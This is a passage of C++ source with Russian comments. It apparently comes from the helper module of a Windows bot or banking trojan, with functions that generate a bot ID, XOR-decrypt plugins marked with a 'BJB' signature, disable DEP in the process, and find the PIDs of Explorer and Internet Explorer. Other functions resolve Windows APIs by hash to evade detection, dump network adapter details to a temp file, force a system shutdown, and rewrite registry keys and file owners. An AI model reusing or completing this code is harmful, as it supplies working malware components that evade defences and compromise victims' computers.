    DWORD dwSize = 0;
    SECURITY_DESCRIPTOR sdSID;

    if ( !(BOOL)pGetTokenInformation( hToken,(TOKEN_INFORMATION_CLASS)1, pTokenUser, 0x200, &dwSize ) )
	{
		return false;
	}

    if ( !(BOOL)pInitializeSecurityDescriptor( &sdSID, SECURITY_DESCRIPTOR_REVISION ) )
	{
		return false;
	}

    if ( !(BOOL)pSetSecurityDescriptorOwner( &sdSID, pTokenUser->User.Sid, false ) )
	{
		return false;
	}

	pCloseHandle( hToken );
	
	if ( !pSetFileSecurityW( Filename, OWNER_SECURITY_INFORMATION, &sdSID ) )
	{
		return false;
	}
    if ( !pSetFileSecurityW( Filename, DACL_SECURITY_INFORMATION, &sdSID ) )
	{
        return false;
	}

	MemFree( pTokenUser );

	return true;
}

DWORD GetProcessHash()
{
	WCHAR ModulePath[ MAX_PATH ];
	pGetModuleFileNameW( NULL, ModulePath, MAX_PATH );
	DWORD dwProcessHash = GetNameHash( ModulePath );

	return dwProcessHash;
}

//HANDLE hBotFile;
//HANDLE hBotMap;



void DisableDEP()
{
	DWORD dwFlags = 0x02;
	pZwSetInformationProcess( (HANDLE)-1, (PROCESSINFOCLASS)0x22, &dwFlags, 4 );
}

LPVOID DecryptPlugin( LPBYTE Pointer, DWORD dwLen )
{
	if ( Pointer != NULL && dwLen > 4 )
	{
		char Signature[] = {'B','J','B',0};

		if ( m_memcmp( Pointer, Signature, 3 ) )
		{
			MemFree( Pointer );
			return NULL;
		}

		dwLen -= 3;
		Pointer = (LPBYTE)( (DWORD)Pointer + 3 );
	}
	else
	{
		return NULL;
	}

	DWORD dwPassLen = *(DWORD*)Pointer;

	Pointer	 += sizeof( DWORD );
	dwLen	 -= sizeof( DWORD );

	char *Password = (char*)MemAlloc( dwPassLen + 1 );
	
	m_memcpy( Password, Pointer, dwPassLen );

	Password[ dwPassLen ] = '\0';

	Pointer += dwPassLen;
	dwLen	-= dwPassLen;

	DWORD dwSize = XORCrypt::Crypt( Password, Pointer, dwLen );

	return Pointer;
}


DWORD GetExplorerPid()
{
	// Функция возвращает идентификатор процесса эксплорера (Explorer.exe)

    DWORD ExplorerPid = 0;

	// Первым этапом пытаемся получить идентификатор по хэндлу окна системного
	// трэя.
	char Class[] = {'S','h','e','l','l','_','T','r','a','y','W','n','d',0};
	pGetWindowThreadProcessId(pFindWindowA(Class, NULL), &ExplorerPid);
	
	// В случае если не удалось определить идентификатор по хэндлу окна
	// определяем его по имени запущенного процесса
	if ( !ExplorerPid )
		ExplorerPid = GetProcessIdByHash(0x490A0972 /* explorer.exe */);

	return ExplorerPid;
}

DWORD GetIExplorerPid()
{
	// Функция возвращает идентификатор процесса интернет эксплорера
	DWORD ExplorerPid = 0;

	// Первым этапом пытаемся получить идентификатор по хэндлу окна iexplorer.exe
	// трэя.
	char Class[] = {'I','E','F','r','a','m','e',0};
	pGetWindowThreadProcessId(pFindWindowA(Class, NULL), &ExplorerPid);
	
	// В случае если не удалось определить идентификатор по хэндлу окна
	// определяем его по имени запущенного процесса
	if ( !ExplorerPid )
		ExplorerPid = GetProcessIdByHash(0x2500D98F);

	return ExplorerPid;
}

//----------------------------------------------------------------------------

// Набор значений для генератора случайных чисел
static DWORD Random_State[16] = {0};

// Индекс генератора случайных чисел
static unsigned int Random_Index = 0;


void Random::Initialize()
{
	// Инициализируем генератор случайных чисел
	for (int i = 0; i < 16; i++)
	{
		Random_State[i] = (DWORD)pGetTickCount();
		pSleep(3 * i);
	}
}


DWORD Random::Generate()
{
	// Генерировать случайное число
	if (Random_State[0] == 0)
		Initialize();


	DWORD a, b, c, d;
	a = Random_State[Random_Index];
	c = Random_State[(Random_Index + 13) & 15];
	b = a^c^(a << 16)^(c << 15);
	c = Random_State[(Random_Index+9)&15];
	c ^= (c>>11);
	a = Random_State[Random_Index] = b^c;
	d = a^((a << 5) & 0xDA442D20UL);
	Random_Index = (Random_Index + 15) & 15;
	a = Random_State[Random_Index];
	Random_State[Random_Index] = a^b^d^(a << 2)^(b << 18)^(c << 28);
	return Random_State[Random_Index];
}


DWORD Random::Generate(DWORD Min, DWORD Max)
{
	// Генерировать случайное число в диапазоне от Min до Max
	DWORD Range = 0;
	DWORD Min_V = 0;

	if (Max >= Min)
	{
		Range = Max - Min;
		Min_V = Min;
	}
	else
	{
		Range = Min - Max;
		Min_V = Max;
	}

	return Generate() % (Range + 1) + Min_V;
}

namespace Random
{
	void FillChars(char* S, DWORD Length, char Min, char Max)
	{
		if (S)
		{
			for (DWORD i = 0; i < Length; i++, S++)
				*S = (char)Random::Generate(Min, Max);
		}
    }
}


PCHAR Random::RandomString(DWORD Length, char Min, char Max)
{
	// Генерировать строку случайных символов
	// Min, Max - диапазон генерации символов
	PCHAR S = STR::Alloc(Length);
	FillChars(S, Length, Min, Max);
	return S;
}


string Random::RandomString2(DWORD Length, char Min, char Max)
{
	string S;
	S.SetLength(Length);
    FillChars(S.t_str(), Length, Min, Max);
	return S;
}
//----------------------------------------------------------------------------




PCHAR GenerateBotID()
{
    const DWORD BufSize = 2048;
	PCHAR Buf = (PCHAR)MemAlloc(BufSize);
	if (Buf == NULL)
		return NULL;
    m_memset(Buf, 0, BufSize);

	GenerateUid(Buf);
	PCHAR Result = STR::New(Buf);

	MemFree(Buf);
    return Result;
}

//----------------------------------------------------------------------------

bool DirExists(PCHAR Path)
{
	// Функция возвращает истину если путь Path существует
  DWORD Code = (DWORD)pGetFileAttributesA(Path);
  return (Code != INVALID_FILE_ATTRIBUTES) && ((Code & FILE_ATTRIBUTE_DIRECTORY) != 0);
}
//----------------------------------------------------------------------------

bool FileExistsA(const PCHAR FileName)
{
	DWORD Code = (DWORD)pGetFileAttributesA(FileName);
	return (Code != INVALID_FILE_ATTRIBUTES) && ((Code & FILE_ATTRIBUTE_DIRECTORY) == 0);
}

bool FileExistsW(const PWCHAR FileName)
{
	DWORD Code = (DWORD)pGetFileAttributesW(FileName);
		return (Code != INVALID_FILE_ATTRIBUTES) && ((Code & FILE_ATTRIBUTE_DIRECTORY) == 0);
}

//----------------------------------------------------------------------------


bool InvalidPath(char *Path)
{
	// Функция вернёт истину в случае если путь один из ".", ".."
	return (StrSame(Path, ".") || StrSame(Path,".."));
}

struct TRecursiveSearchData
{
	PCHAR Mask;
	LPVOID Data;
    DWORD Attributes;
    TFilesCallBack CallBack;
};

void RecursuveSearchCallBack(PFindData Find, PCHAR Path, LPVOID Data, bool &Cancel)
{
	// Ищем файлы в директории
	TRecursiveSearchData *SD = (TRecursiveSearchData *)Data;
	Cancel = SearchFiles(Path, SD->Mask, false, SD->Attributes, SD->Data, SD->CallBack) == false;
}

bool SearchFiles(PCHAR Path, PCHAR Mask, bool Recursive, DWORD FileAttributes,
				 LPVOID Data, TFilesCallBack CallBack)
{
	// Функция пербирает все поддериктории
	if (STR::IsEmpty(Path) || STR::IsEmpty(Mask) || CallBack == NULL)
		return true;

	PCHAR SearchMask = STR::Alloc( m_lstrlen(Path) + m_lstrlen(Mask) + 10 );
	if (SearchMask == NULL)
		return true;
	m_lstrcpy( SearchMask, Path );
	pPathAppendA( SearchMask, Mask );

	//  Ищем первую директорию
	WIN32_FIND_DATAA Find;
	ClearStruct(Find);
	HANDLE File = pFindFirstFileA(SearchMask, &Find);

	//  Директория не найдена, выходим из функции
	if (File == INVALID_HANDLE_VALUE)
	{
		STR::Free(SearchMask);
		DWORD Error = (DWORD)pGetLastError();

		if (FileAttributes == FA_DIRECTORY)
			return true;

		if (Error != 5 /* Нет доступа */ && Recursive && DirExists(Path))
		{

			TRecursiveSearchData SD;
			SD.Mask = Mask;
			SD.Data = Data;
			SD.Attributes = FileAttributes;
			SD.CallBack = CallBack;
			return SearchFiles(Path, "*.*", true, FA_DIRECTORY, &SD, RecursuveSearchCallBack);
		}
		else
			return true;
	}

	bool Cancel = false;
	bool RecursiveHandled = false;
    DWORD Count = 0;
	PCHAR NewPath = NULL;
	DWORD Attributes = FileAttributes;

	if (Recursive)
		Attributes = Attributes | FILE_ATTRIBUTE_DIRECTORY;

	do
	{
        if (!InvalidPath(Find.cFileName))
		if ((Find.dwFileAttributes & Attributes) != 0)
		{
            Count++;
			// Собираем полное имя
			NewPath = STR::Alloc( m_lstrlen(Path) + m_lstrlen(Find.cFileName) + 10 );
			m_lstrcpy( NewPath, Path );
			pPathAppendA( NewPath, Find.cFileName );
			if( Find.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY )
				m_lstrcat( NewPath, "\\" );

			// Вызываем метод обратной связи
			if ((Find.dwFileAttributes & FileAttributes) != 0)
				CallBack(&Find,  NewPath, Data, Cancel);
            //
			if (!Cancel && Recursive && (Find.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) != 0)
			{
				RecursiveHandled = true;
				Cancel = !SearchFiles(NewPath, Mask, true, FileAttributes, Data, CallBack);
			}

			STR::Free(NewPath);
			if (Cancel) break;
		}
	}
	while (pFindNextFileA(File, &Find));

	pFindClose(File);
	STR::Free(SearchMask);

	// В случае если рекурсивный поиск не обработан, то производим
	// рекурсивный перебор директорий
	if (!Cancel && Recursive && !RecursiveHandled && Count > 0)
	{
		TRecursiveSearchData SD;
		SD.Mask = Mask;
		SD.Data = Data;
		SD.Attributes = FileAttributes;
		SD.CallBack = CallBack;
        Cancel = SearchFiles(Path, "*.*", true, FA_DIRECTORY, &SD, RecursuveSearchCallBack) == false;
    }

	return Cancel == false;
}
//----------------------------------------------------------------------------

DWORD GetUniquePID(DWORD *ThreadHandle)
{
	// Функция возвращает уникальный идентификатор процесса. Определяется по
	// потоку из которого вызывается модуль
	HANDLE Thread = pGetCurrentThread();
	THREAD_BASIC_INFORMATION Threads;
	DWORD dwReturnLen;

	if (ThreadHandle != NULL)
    	*ThreadHandle = (DWORD)Thread;

	if ( pZwQueryInformationThread(Thread, ThreadBasicInformation, &Threads, sizeof(THREAD_BASIC_INFORMATION ), &dwReturnLen ) == STATUS_SUCCESS )
		return (DWORD)Threads.ClientId.UniqueProcess;

	return -1;
}

DWORD GetUniquePID()
{
	 return GetUniquePID(NULL);
}

DWORD GetParentPID( DWORD pid )
{
	HANDLE snap = pCreateToolhelp32Snapshot( TH32CS_SNAPPROCESS, 0 );
	PROCESSENTRY32W ps;
	ps.dwSize = sizeof(PROCESSENTRY32W);
	DWORD res = 0;
	if( pProcess32FirstW( snap, &ps ) )
	{
		do
		{
			if( ps.th32ProcessID == pid )
			{
				res = ps.th32ParentProcessID;
				break;
			}
		} while( pProcess32NextW( snap, &ps ) );
		pCloseHandle(snap);
	}
	return res;
}

DWORD GetParentPID()
{
	return GetParentPID( GetUniquePID() );
}

bool IsProcessLeave(int pid)
{
	return GetParentPID(pid) != 0;
}


//----------------------------------------------------------------------------

bool IsNewProcess(DWORD &ProcessID, DWORD *Thread)
{
	// Функция возвращает истину если идентификатор текущего процесса
	// отличается от идентификатора ProcessID. Если это другой процесс
	// то PID будет записан в ProcessID
	DWORD NewPID = GetUniquePID(Thread);
	if (ProcessID != NewPID)
	{
		ProcessID = NewPID;
        return true;
	}
	return false;
}


//----------------------------------------------------------------------------
char *GetNetInfo()
{

	// Какому мудаку было впадлу пару строчек коментария вписать???????

/*	char iphldll[] = {'i','p','h','l','p','a','p','i','.','d','l','l',0};

	typedef DWORD ( WINAPI *PGetAdaptersInfo )( PIP_ADAPTER_INFO pAdapterInfo, PULONG pOutBufLen );

	PGetAdaptersInfo pGetAdaptersInfo = (PGetAdaptersInfo)GetProcAddressEx( iphldll, 0, 0xE69A1CD7 );*/

	PIP_ADAPTER_INFO pAdapterInfo;

	PIP_ADAPTER_INFO pAdapter = NULL;
	DWORD dwRetVal			  = 0;

	pAdapterInfo	  = (IP_ADAPTER_INFO *)MemAlloc( sizeof(IP_ADAPTER_INFO) );
	ULONG ulOutBufLen = sizeof(IP_ADAPTER_INFO);


	if ( (ULONG)pGetAdaptersInfo( pAdapterInfo, &ulOutBufLen) == ERROR_BUFFER_OVERFLOW )
	{
		MemFree(pAdapterInfo);
		pAdapterInfo = (IP_ADAPTER_INFO *) MemAlloc ( ulOutBufLen );
	}

	typedef int ( WINAPI *fwsprintfA )(PCHAR lpOut, LPCTSTR lpFmt, ... );
	fwsprintfA _pwsprintfA = (fwsprintfA)GetProcAddressEx( NULL, 3, 0xEA3AF0D7 );

	PCHAR FileName = File::GetTempNameA();

	if ( !FileName )
	{
		return NULL;
	}


	HANDLE hLog = (HANDLE)pCreateFileA( FileName, GENERIC_WRITE, FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0 );

	if ( hLog == (HANDLE)-1 )
	{
		return NULL;
	}

	DWORD dwWritten = 0;

	if ( ( dwRetVal = (ULONG)pGetAdaptersInfo( pAdapterInfo, &ulOutBufLen)) == NO_ERROR )
	{
		pAdapter = pAdapterInfo;

		while ( pAdapter )
		{
			char *Buffer = (char*)MemAlloc( 1024 );

			_pwsprintfA( Buffer, "\tAdapter Name: \t%s\r\n", pAdapter->AdapterName);
			pWriteFile( hLog, Buffer, m_lstrlen( Buffer ), &dwWritten, 0 );

			_pwsprintfA( Buffer, "\tAdapter Desc: \t%s\r\n", pAdapter->Description);
			pWriteFile( hLog, Buffer, m_lstrlen( Buffer ), &dwWritten, 0 );

			_pwsprintfA( Buffer, "\tAdapter Addr: \t%ld\r\n", pAdapter->Address);
			pWriteFile( hLog, Buffer, m_lstrlen( Buffer ), &dwWritten, 0 );

			_pwsprintfA( Buffer, "\tIP Address: \t%s\r\n", pAdapter->IpAddressList.IpAddress.String);
			pWriteFile( hLog, Buffer, m_lstrlen( Buffer ), &dwWritten, 0 );

			_pwsprintfA( Buffer, "\tIP Mask: \t%s\r\n", pAdapter->IpAddressList.IpMask.String);
			pWriteFile( hLog, Buffer, m_lstrlen( Buffer ), &dwWritten, 0 );

			_pwsprintfA( Buffer, "\tGateway: \t%s\r\n", pAdapter->GatewayList.IpAddress.String);
			pWriteFile( hLog, Buffer, m_lstrlen( Buffer ), &dwWritten, 0 );

			_pwsprintfA( Buffer, "\tMAC Address: %2X-%2X-%2X-%2X-%2X-%2X",  pAdapter->Address[0], pAdapter->Address[1],
											pAdapter->Address[2], pAdapter->Address[3],
											pAdapter->Address[4], pAdapter->Address[5] );

			pWriteFile( hLog, Buffer, m_lstrlen( Buffer ), &dwWritten, 0 );
			

			_pwsprintfA( Buffer, "\t\r\n\r\n***\r\n\r\n\r\n");
			pWriteFile( hLog, Buffer, m_lstrlen( Buffer ), &dwWritten, 0 );

			
			if ( pAdapter->DhcpEnabled )
			{
				_pwsprintfA( Buffer, "\tDHCP Enabled: Yes\r\n");
				pWriteFile( hLog, Buffer, m_lstrlen( Buffer ), &dwWritten, 0 );

				_pwsprintfA( Buffer, "\t\tDHCP Server: \t%s\r\n", pAdapter->DhcpServer.IpAddress.String);
				pWriteFile( hLog, Buffer, m_lstrlen( Buffer ), &dwWritten, 0 );

				_pwsprintfA( Buffer, "\tLease Obtained: %ld\r\n", pAdapter->LeaseObtained);
				pWriteFile( hLog, Buffer, m_lstrlen( Buffer ), &dwWritten, 0 );
			}
			else
			{
				_pwsprintfA( Buffer, "\tDHCP Enabled: No\r\n");
				pWriteFile( hLog, Buffer, m_lstrlen( Buffer ), &dwWritten, 0 );
			}

			if ( pAdapter->HaveWins )
			{
				_pwsprintfA( Buffer, "\tHave Wins: Yes\r\n");
				pWriteFile( hLog, Buffer, m_lstrlen( Buffer ), &dwWritten, 0 );

				_pwsprintfA( Buffer, "\t\tPrimary Wins Server: \t%s\r\n", pAdapter->PrimaryWinsServer.IpAddress.String);
				pWriteFile( hLog, Buffer, m_lstrlen( Buffer ), &dwWritten, 0 );

				_pwsprintfA( Buffer, "\t\tSecondary Wins Server: \t%s\r\n", pAdapter->SecondaryWinsServer.IpAddress.String);
				pWriteFile( hLog, Buffer, m_lstrlen( Buffer ), &dwWritten, 0 );
			}
			else
			{
				_pwsprintfA( Buffer, "\tHave Wins: No\r\n");
				pWriteFile( hLog, Buffer, m_lstrlen( Buffer ), &dwWritten, 0 );
			}

			
			pAdapter = pAdapter->Next;
		}
	}

	pCloseHandle( hLog );	

	return FileName;
}

DWORD GetFileFormat( WCHAR *lpFileName )
{
	if ( !lpFileName )
	{
		return 0;
	}

	WCHAR *Name = NULL;

	WCHAR lpFile[ MAX_PATH ];
	plstrcpyW( lpFile, lpFileName );
	m_wcslwr( lpFile );
	
	for ( DWORD i = m_wcslen( lpFile ) - 1; i > 0; i-- )
	{
		if ( lpFile[i] == '.' )
		{
			Name = &lpFile[i + 1];
			break;
		}
	}

	return CalcHashW( Name );
}


void MakeShutdown()
{
	BOOLEAN bWasEnabled;
	pRtlAdjustPrivilege( SE_SHUTDOWN_PRIVILEGE, TRUE, FALSE, &bWasEnabled );
	pZwShutdownSystem( 1 );

	return;
}


//----------------------------------------------------------------------------
// Registry - методы для работы с реестром Windows
//----------------------------------------------------------------------------

bool Registry::CreateKey(HKEY h, char* path, char* name )
{
	// cсоздать раздел в реестре
	//  CreateKey(HKEY_CURRENT_USER,"Software\\Microsoft\\Internet Explorer\\Main","TabProcGrowth");
	HKEY key;
	if((long)pRegOpenKeyExA(h, path, 0, KEY_WRITE, &key) == REG_OPENED_EXISTING_KEY)
		return false;
	if ((LONG)pRegCreateKeyA(key, name, &key) != ERROR_SUCCESS)
		return false;

	pRegCloseKey(key);
	return true;
}


bool Registry::SetValueString(HKEY h, char* path, char* name,  char* values )
{
	//корневой ключ, путь без ключа, имя создаваемого значения,
	// значение(создает заменяет значение REG_SZ)
	HKEY key;
	TCHAR title[MAX_PATH];
	m_memset(title,0,MAX_PATH);

	if((long)pRegOpenKeyExA(h,path,0,KEY_WRITE, &key)==REG_OPENED_EXISTING_KEY)
		return false;
	m_lstrcpy(title, values);
//   RegGetValueA
	pRegSetValueExA(key, name, 0,REG_SZ,(LPBYTE)title,m_lstrlen(values));
	pRegCloseKey(key);
	return true;
}

bool Registry::SetValueDWORD(HKEY h, char* path, char* name,  DWORD values )
{
	//Корневой ключ, путь без ключа, имя создаваемого значения,
	// значение(создает заменяет значение REG_DWORD)
	HKEY key;
	if((long)pRegOpenKeyExA(h,path,0,KEY_WRITE, &key)==REG_OPENED_EXISTING_KEY)
		return false;
	pRegSetValueExA(key, name, 0,REG_DWORD,(CONST BYTE*)&values,sizeof(DWORD));
	pRegCloseKey(key);
	return true;
}


// Функция получает строковое значение из реестра
PCHAR Registry::GetStringValue(HKEY Key, PCHAR SubKey, PCHAR Value)
{
	// Функция получает строковое значение из реестра
	HKEY OpenedKey;
	// Открываем ключ
	if (pRegOpenKeyExA(Key, SubKey, 0, KEY_READ, &OpenedKey) != ERROR_SUCCESS)
		return NULL;

	DWORD Type = REG_SZ;
	DWORD Sz = 0;
	PCHAR Result = NULL;

	// Получаем размер строки
	if (pRegQueryValueExA(OpenedKey, Value, NULL, &Type, NULL, &Sz) == ERROR_SUCCESS)
	{
		// Читаем строку
		Result = STR::Alloc(Sz);
		if (pRegQueryValueExA(OpenedKey, Value, NULL, &Type, (LPBYTE)Result, &Sz)  != ERROR_SUCCESS)
		STR::Free2(Result);;
    }

	pRegCloseKey(OpenedKey);
	return Result;
}

bool Registry::CreateValueString(HKEY h, char* path, char* name,  char* values )
{
  //корневой ключ, путь без ключа, имя создаваемого значения,
 // значение(создает заменяет значение REG_SZ)
    HKEY hKey;
	if((long)pRegOpenKeyExA(h, path, 0, KEY_WRITE, &hKey) == REG_OPENED_EXISTING_KEY)
	{
		pRegSetValueExA(hKey,name, NULL, REG_SZ,(LPBYTE)values,m_lstrlen(values));
        pRegCloseKey(hKey);
		return true;
    }
    if((long)pRegCreateKeyExA(h,path,0,"",REG_OPTION_NON_VOLATILE,KEY_ALL_ACCESS,NULL,&hKey,NULL)==ERROR_SUCCESS)
    {
		pRegSetValueExA(hKey,name, NULL, REG_SZ,(LPBYTE)values,m_lstrlen(values));
        pRegCloseKey(hKey);
		return true;
    }
	return false;
}


bool Registry::CreateValueREGMULTI_SZ(HKEY h, char* path, char* name,  char* values,DWORD sise )
{
	HKEY hKey;
	if((long)pRegOpenKeyExA(h, path, 0, KEY_WRITE, &hKey) == REG_OPENED_EXISTING_KEY)
	{
		pRegSetValueExA(hKey,name, NULL, REG_MULTI_SZ,(LPBYTE)values,sise);
        pRegCloseKey(hKey);
		return true;
    }
    if((long)pRegCreateKeyExA(h,path,0,"",REG_OPTION_NON_VOLATILE,KEY_ALL_ACCESS,NULL,&hKey,NULL)==ERROR_SUCCESS)
    {
		pRegSetValueExA(hKey,name, NULL, REG_MULTI_SZ,(LPBYTE)values,sise);
        pRegCloseKey(hKey);
		return true;
    }
	return false;
}
// добавляет права SE_BACKUP_NAME
bool Registry::SetPrivilege(LPCTSTR lpszPrivilege, BOOL bEnablePrivilege)
{
	TOKEN_PRIVILEGES tp;
	LUID luid;
	HANDLE hToken; 

	pOpenProcessToken(pGetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken);
	if ( !pLookupPrivilegeValueA(NULL, lpszPrivilege, &luid) )    
		return false; 
	
	tp.PrivilegeCount = 1;
	tp.Privileges[0].Luid = luid;
	
	if (bEnablePrivilege)
		tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	else
	    tp.Privileges[0].Attributes = 0;

	pAdjustTokenPrivileges(hToken, FALSE, &tp, 0, (PTOKEN_PRIVILEGES) NULL, 0); 

	return ( (pGetLastError()!=ERROR_SUCCESS)?false:true);
}


//	Есть ли ключ
//	Вернет  TRUE если да, иначе FALSE
bool Registry::IsKeyExist(HKEY hRoot, LPCSTR KeyPath)
{
	HKEY		hKey;
	bool		ret;

	if ( hRoot == NULL ) return false;
	if ( KeyPath == NULL || (!plstrlenA(KeyPath)) ) return false;
	
	ret =((pRegOpenKeyExA (hRoot, KeyPath, 0, KEY_EXECUTE, &hKey)!=ERROR_SUCCESS)?false:true);
	//ret =(bool) pRegOpenKeyExA (hRoot, KeyPath, 0, KEY_EXECUTE, &hKey);

	if ( ((LONG)pRegOpenKeyExA (hRoot, KeyPath, 0, KEY_EXECUTE, &hKey)==ERROR_FILE_NOT_FOUND) ||
		 ((LONG)pRegOpenKeyExA (hRoot, KeyPath, 0, KEY_EXECUTE, &hKey)!=ERROR_SUCCESS) )
		ret=false;
	else 
		ret=true;
	
	pRegCloseKey (hKey);

	return ret;
}
// сохраняет ключь реестра в файл
// тобишь Registry::SaveRegKeyPath(HKEY_LOCAL_MACHINE,"Software\\Policies\\Microsoft","d:\\e.txt");
bool Registry::SaveRegKeyPath(HKEY hRoot, PCHAR SubKey,PCHAR OutFile)
{
	bool	ret=true;
	HKEY	hKey=NULL;
	DWORD	d;

	SetPrivilege(SE_BACKUP_NAME,TRUE);

	if (pRegOpenKeyExA(hRoot, SubKey,0,KEY_READ, &hKey)==ERROR_SUCCESS)  
	{
		if (FileExistsA(OutFile))
		{
			if (pDeleteFileA(OutFile))	//we must delete file before saving, otherwise it doesn't work !
				d=(LONG)pRegSaveKeyExA(hKey,OutFile,NULL,REG_STANDARD_FORMAT);
			else
				d = pGetLastError();
		} 
		else 
			d=(LONG)pRegSaveKeyExA(hKey,OutFile,NULL,REG_STANDARD_FORMAT);
		if (d!=ERROR_SUCCESS) 
		{
			ret=false;			
		}		
		pRegCloseKey(hKey);	
	} 
	else 
	{ 
		if (IsKeyExist(hRoot,SubKey)==false)
			d=ERROR_FILE_NOT_FOUND;
		else d=pGetLastError();
		//PrintError(d);
		ret=false;
	}
	
	SetPrivilege(SE_BACKUP_NAME,FALSE);

	return ret;
}


//----------------------------------------------------------------------------
// FILE - методы для работы с файлами
//----------------------------------------------------------------------------


DWORD File::WriteBufferA(const char* FileName, const LPVOID Buffer, DWORD BufferSize)
{
	// Записать данные из буфера в файл. ANSI версия

	if (FileName == NULL)
		return 0;
	HANDLE File = pCreateFileA(FileName, GENERIC_WRITE, FILE_SHARE_READ, 0,
								CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);

	if (File == INVALID_HANDLE_VALUE)
		return 0;

	DWORD Size = 0;
	if (Buffer != NULL && BufferSize != 0)
		pWriteFile(File, Buffer, BufferSize, &Size, NULL);

	pCloseHandle(File);

	return Size;
}
//----------------------------------------------------------------------------

DWORD File::WriteBufferW(const wchar_t* FileName, LPVOID Buffer, DWORD BufferSize)
{
	// Записать данные из буфера в файл. Unicode версия

	if (FileName == NULL)
		return 0;

	HANDLE File = pCreateFileW(FileName, GENERIC_WRITE, FILE_SHARE_READ, 0,
								CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);


	if (File == INVALID_HANDLE_VALUE)
		return 0;

	DWORD Size = -1;
    if(Buffer != NULL)
		pWriteFile(File, Buffer, BufferSize, &Size, NULL);

	pCloseHandle(File);

	return Size;
}
//----------------------------------------------------------------------------

LPBYTE FileRealReadToBuffer(HANDLE File, DWORD &BufferSize)
{
	BufferSize = 0;
	if (File == INVALID_HANDLE_VALUE)
		return NULL;

	DWORD H;
	DWORD Size = (DWORD)pGetFileSize(File, &H);

    LPBYTE Result = NULL;
	if (Size > 0)
	{
		// Читаем файл
		Result = (LPBYTE)MemAlloc(Size);
		DWORD Readed = 0;
		if (Result != NULL)
			pReadFile(File, Result, Size, &Readed, NULL);
        BufferSize = Readed;
    }

	pCloseHandle(File);
	return Result;
}

//----------------------------------------------------------------------------

LPBYTE File::ReadToBufferA(const char* FileName, DWORD &BufferSize)
{
	// Прочитать файл в буфер

	if (FileName == NULL)
		return NULL;

	HANDLE File = pCreateFileA(FileName, GENERIC_READ, FILE_SHARE_READ, 0,
								OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);

	return FileRealReadToBuffer(File, BufferSize);
}
//----------------------------------------------------------------------------

LPBYTE File::ReadToBufferW(const wchar_t* FileName, DWORD &BufferSize)
{
	// Прочитать файл в буфер
	if (FileName == NULL)
		return NULL;

	HANDLE File = pCreateFileW(FileName, GENERIC_READ, FILE_SHARE_READ, 0,
								OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);

	return FileRealReadToBuffer(File, BufferSize);
}
//----------------------------------------------------------------------------

PCHAR File::ChangeFileExt(PCHAR FileName, PCHAR Ext)
{
	// Изменить расширение файла. Касается только строки FileName!!!
	// Примечание - Расширение меняется вместе с точкой
	// Результат - НОВАЯ строка с именем файла
	if (STR::IsEmpty(FileName))
    	return NULL;

	PCHAR EndPtr = STR::End(FileName);

	// Ишем точку в файле
	while (*EndPtr != '.')
	{
		if (EndPtr == FileName || *EndPtr == '/' || *EndPtr == '\\')
		{
			EndPtr = NULL;
			break;
        }
        EndPtr--;
    }


	//
	if (EndPtr == NULL)
		return STR::New(2, FileName, Ext);
	else
	{
		DWORD Sz = EndPtr - FileName;
		DWORD ExtLen = StrCalcLength(Ext);
		PCHAR Res = STR::Alloc(Sz + ExtLen);
		STR::Copy(FileName, Res, 0, Sz);
		STR::Copy(Ext, Res + Sz, 0, ExtLen);
		return Res;
	}
}
//-----------------------------------------------------------------------------

PCHAR File::GetTempNameA()
{
	PCHAR Path = STR::Alloc(MAX_PATH);
	if (Path == NULL) return NULL;
	return GetTempName(Path);
}

string File::GetTempName2A()
{
	string Name(MAX_PATH);
	GetTempName(Name.t_str());
	Name.CalcLength();
	return Name;
}


//-----------------------------------------------------------------------------

PWCHAR File::GetTempNameW()
{
	PWCHAR Path = WSTR::Alloc(MAX_PATH);
	if (Path == NULL) return NULL;
	return GetTempName(Path);
}

PCHAR File::GetTempName( PCHAR buf, const PCHAR prefix )
{
	pGetTempPathA( MAX_PATH, buf );
	pGetTempFileNameA( buf, prefix, 0, buf );
	return buf;
}

PWCHAR File::GetTempName( PWCHAR buf, const PWCHAR prefix )
{
	pGetTempPathW( MAX_PATH, buf );
	pGetTempFileNameW( buf, prefix, 0, buf );
	return buf;
}

//-----------------------------------------------------------------------------

PCHAR File::ExtractFileNameA(PCHAR FileName, bool DuplicateStr)
{
	//  Функции извлекают имя файла из полного пути
	//  FileName - полное имя файла, если не содержит разделителей / либо\
	//  	то функция вернёт всю строку
	//  DuplicateStr - Установить в истину, если необходимо создать
	//		новую строку из результата. В случае false функция вернёт указатель
	//      на первый символ имени в исходной строке

	if (STR::IsEmpty(FileName)) return NULL;

	PCHAR End = NULL;

	for (PCHAR Tmp = FileName; *Tmp != 0; Tmp++)
		if (*Tmp == '\\' || *Tmp == '/') End = Tmp;


	if (End != NULL)
        End++;
	else
		End = FileName;

	if (DuplicateStr)
		return STR::New(End);
	else
		return End;
}


string  File::ExtractFileNameA(const char* FileName)
{
	return ExtractFileNameA((PCHAR)FileName, false);
}



PWCHAR File::ExtractFileNameW(PWCHAR FileName, bool DuplicateStr)
{
	if (WSTR::IsEmpty(FileName)) return NULL;

	PWCHAR End = NULL;

	for (PWCHAR Tmp = FileName; *Tmp != 0; Tmp++)
		if (*Tmp == '\\' || *Tmp == '/') End = Tmp;


	if (End != NULL)
        End++;
	else
		End = FileName;


	if (DuplicateStr)
		return WSTR::New(End);
	else
		return End;
}
// ---------------------------------------------------------------------------------------

PCHAR File::ExtractFilePathA(PCHAR FileName)
{
	// функция извлекает имя файла из его полного имени
	if (STR::IsEmpty(FileName))
		return NULL;

	PCHAR End = STR::End(FileName);

	while (End > FileName && *End != '/' && *End != '\\') End--;

	if (End == FileName)
		return NULL;
	else
		return STR::New(FileName, (End - FileName) + 1);
}
//-----------------------------------------------------------------------------

DWORD File::GetNameHashA(PCHAR FileName, bool LowerCase)
{
	// Функция возвращает хэш имени файла
	PCHAR Name = ExtractFileNameA(FileName, false);
	return STRA::Hash(Name, 0, LowerCase);
}
//-----------------------------------------------------------------------------

DWORD File::GetNameHashW(PWCHAR FileName, bool LowerCase)
{
